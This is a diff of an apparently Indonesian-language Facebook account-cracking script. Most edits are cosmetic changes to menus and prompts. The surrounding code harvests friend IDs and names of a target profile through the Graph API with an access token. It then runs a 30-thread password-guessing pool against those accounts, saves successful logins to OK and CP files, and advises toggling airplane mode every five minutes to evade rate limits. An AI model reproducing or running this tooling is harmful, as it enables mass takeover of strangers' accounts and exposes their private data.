@@ -173,14 +173,14 @@ def menu_test():
 def krekefbi():
 	banner()
 	print('[𝑻𝒐𝒌𝒆𝒏 𝑨𝒏𝒅𝒂>>>> :  '+str(tokenku)) 
-	print('[01] 𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒌')
-	print('[02] 𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒄 [𝑴𝒂𝒔𝒔𝒂𝒍]')
-	print('[03] 𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑮𝒓𝒖𝒑')
-	jalan('>_𝑴𝒆𝒏𝒖 𝑪𝒉𝒆𝒄𝒌𝑶𝒑𝒔𝒊/𝑯𝒂𝒔𝒊𝒍 𝑶𝑲/𝑪𝑷')
-	print('[04] 𝑪𝒉𝒆𝒄𝒌 𝑶𝒑𝒔𝒊 𝑯𝒂𝒔𝒊𝒍 𝑪𝒉𝒆𝒄𝒌𝒑𝒐𝒊𝒏𝒕')
-	print('[05] 𝑪𝒆𝒌 𝑯𝒂𝒔𝒊𝒍 𝑪𝒓𝒂𝒄𝒌 𝑶𝑲/𝑪𝑷')
-	print('[00] 𝑬𝒙𝒊𝒕') 
-	badag = input('>_ 𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑷𝒊𝒍𝒊𝒉. :  ')
+	jalan('[01] 𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒌')
+	jalan('[02] 𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒄 [𝑴𝒂𝒔𝒔𝒂𝒍]')
+	jalan('[03] 𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑮𝒓𝒖𝒑')
+	jalan('➣ 𝑴𝒆𝒏𝒖 𝑪𝒉𝒆𝒄𝒌𝑶𝒑𝒔𝒊/𝑯𝒂𝒔𝒊𝒍 𝑶𝑲/𝑪𝑷')
+	jalan('[04] 𝑪𝒉𝒆𝒄𝒌 𝑶𝒑𝒔𝒊 𝑯𝒂𝒔𝒊𝒍 𝑪𝒉𝒆𝒄𝒌𝒑𝒐𝒊𝒏𝒕')
+	jalan('[05] 𝑪𝒆𝒌 𝑯𝒂𝒔𝒊𝒍 𝑪𝒓𝒂𝒄𝒌 𝑶𝑲/𝑪𝑷')
+	jalan('[00] 𝑬𝒙𝒊𝒕') 
+	badag = input('➣  𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑷𝒊𝒍𝒊𝒉. :  ')
 	if badag in ['1','01']:
 		jancok()
 	elif badag in ['2','02']:
@@ -404,14 +404,14 @@ def dump_publik():
 	win = '>_𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒌'
 	win2 = mark(win, style='cyan')
 	sol().print(win2)
-	print('\033[33m>_𝑲𝒆𝒕𝒊𝒌 ❞𝒎𝒆❞ 𝑱𝒊𝒌𝒂 𝑰𝒏𝒈𝒊𝒏 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑫𝒂𝒓𝒊 𝑻𝒆𝒎𝒂𝒏')
-	pil = input('\033[33m>_𝑴𝒂𝒔𝒖𝒌𝒂𝒏 𝑰𝑫 𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : ')
+	print('\033[33m➣ 𝑲𝒆𝒕𝒊𝒌 ❞𝒎𝒆❞ 𝑱𝒊𝒌𝒂 𝑰𝒏𝒈𝒊𝒏 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑫𝒂𝒓𝒊 𝑻𝒆𝒎𝒂𝒏')
+	pil = input('\033[33m➣ 𝑴𝒂𝒔𝒖𝒌𝒂𝒏 𝑰𝑫 𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/v4.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
 		for pi in koh2['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print('\033[33m>_Total : '+str(len(id)))
+		print('\033[33m➣ Total : '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		li = '>_𝑲𝒐𝒏𝒆𝒌𝒔𝒊 𝑰𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝑩𝒆𝒓𝒎𝒂𝒔𝒂𝒍𝒂𝒉'
@@ -477,7 +477,7 @@ def setting():
 	teks = '[01] >_𝑪𝒓𝒂𝒄𝒌 𝑫𝒂𝒓𝒊 𝑨𝒌𝒖𝒏 𝑻𝒖𝒂 (𝑵𝒐𝒏𝒆)\n[02] >_𝑪𝒓𝒂𝒄𝒌 𝑫𝒂𝒓𝒊 𝑨𝒌𝒖𝒏 𝑴𝒖𝒅𝒂 (𝑵𝒐𝒏𝒆)'
 	tak = nel(teks, style='cyan')
 	cetak(nel(tak, title='>_Set'))
-	hu = input('\033[33m>_𝑷𝑰𝑳𝑰𝑯 : ')
+	hu = input('\033[33m_𝑷𝑰𝑳𝑰𝑯 : ')
 	if hu in ['1','01']:
 		for bacot in id:
 			id2.append(bacot)
@@ -486,15 +486,15 @@ def setting():
 			id2.insert(0,bacot)
 	
 	else:
-		ric = '>_𝑷𝒊𝒍𝒊𝒉𝒂𝒏 𝑻𝒊𝒅𝒂𝒌 𝑨𝒅𝒂 𝑫𝒊𝒎𝒆𝒏𝒖'
+		ric = '➣ 𝑷𝒊𝒍𝒊𝒉𝒂𝒏 𝑻𝒊𝒅𝒂𝒌 𝑨𝒅𝒂 𝑫𝒊𝒎𝒆𝒏𝒖'
 		sol().print(mark(ric, style='red'))
 		exit()
-	met = '>_𝑷𝒊𝒍𝒊𝒉 𝑴𝒆𝒕𝒉𝒐𝒅𝒔 𝑪𝒓𝒂𝒄𝒌'
+	met = '➣ 𝑷𝒊𝒍𝒊𝒉 𝑴𝒆𝒕𝒉𝒐𝒅𝒔 𝑪𝒓𝒂𝒄𝒌'
 	sol().print(mark(met, style='cyan'))
-	ioz = '[01] Methode B-Api\n[02] Methode Mobile\n[03] Methode Mbasic\n[04] Methode Touch [New]\n[05] Methode FB X [New]\n[06] Methode Free FB [New]'
+	ioz = '[01] Methode B-Api\n[02] Methode Mobile\n[03] Methode Mbasic \n[04] Methode Touch \n[05] Methode FB X \n[06] Methode Free FB '
 	gess = nel(ioz, style='cyan')
-	cetak(nel(gess, title='>_Methode'))
-	hc = input('\033[33m>_Pilih : ')
+	cetak(nel(gess, title='SILAHKAN PILIH METODE'))
+	hc = input('\033[33m➣ Pilih : ')
 	if hc in ['1','01']:
 		method.append('api')
 	elif hc in ['3','03']:
@@ -504,14 +504,14 @@ def setting():
 		method.append('touch')
 		method.append('xfb')
 		method.append('free')
-	guw = '>_𝑶𝒑𝒔𝒊 𝑪𝒓𝒂𝒄𝒌'
+	guw = '➣ 𝑶𝒑𝒔𝒊 𝑪𝒓𝒂𝒄𝒌'
 	sol().print(mark(guw, style='cyan'))
-	aplik = input('\033[33m 𝑻𝒂𝒎𝒑𝒊𝒍𝒌𝒂𝒏 𝑨𝒑𝒍𝒊𝒌𝒂𝒔𝒊 𝑻𝒆𝒓𝒌𝒂𝒊𝒕 ? (𝒚/𝒕) : ')
+	aplik = input('\033[33m➣ 𝑻𝒂𝒎𝒑𝒊𝒍𝒌𝒂𝒏 𝑨𝒑𝒍𝒊𝒌𝒂𝒔𝒊 𝑻𝒆𝒓𝒌𝒂𝒊𝒕 ? (𝒚/𝒕) : ')
 	if aplik in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	osk = input('\033[33m>_𝑻𝒂𝒎𝒑𝒊𝒍𝒌𝒂𝒏 𝑶𝒑𝒔𝒊 𝑪𝒉𝒆𝒄𝒌𝒑𝒐𝒊𝒏𝒕 ? (𝒚/𝒕) : ')
+	osk = input('\033[33m➣ 𝑻𝒂𝒎𝒑𝒊𝒍𝒌𝒂𝒏 𝑶𝒑𝒔𝒊 𝑪𝒉𝒆𝒄𝒌𝒑𝒐𝒊𝒏𝒕 ? (𝒚/𝒕) : ')
 	if osk in ['y','Y']:
 		oprek.append('ya')
 	else:
@@ -519,10 +519,10 @@ def setting():
 	passwrd()
 
 def passwrd():
-	ler = '>_Succes'
+	ler = '➣ Succes'
 	sol().print(mark(ler, style='cyan'))
 	krek = 'Hasil Ok  Disimpan Ke : OK/%s\nHasil Cp Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
-	cetak(nel(krek, title='>_CRACK'))
+	cetak(nel(krek, title=' INFROMASI '))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
